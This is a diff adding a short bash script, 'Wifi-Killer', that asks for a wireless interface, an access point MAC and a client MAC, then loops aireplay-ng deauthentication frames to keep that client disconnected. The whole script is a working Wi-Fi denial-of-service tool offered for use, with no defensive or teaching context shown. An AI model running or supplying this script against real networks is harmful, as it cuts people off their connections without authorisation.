@@ -1,0 +1,16 @@
+#!/bin/bash
+
+echo "Wifi-Killer [Version 1.0]"
+echo "Written by Marin4o"
+echo
+read -p "Enter interface to use(monitor mode): " iface
+read -p "Enter access point MAC: " apaddr
+read -p "Enter client MAC: " addr
+echo
+echo "Press Ctrl+C to stop"
+echo
+echo "Dropping all requests from" $addr "..."
+while :
+do
+	aireplay-ng -0 1 -a $apaddr -c $addr $iface > /dev/null
+done
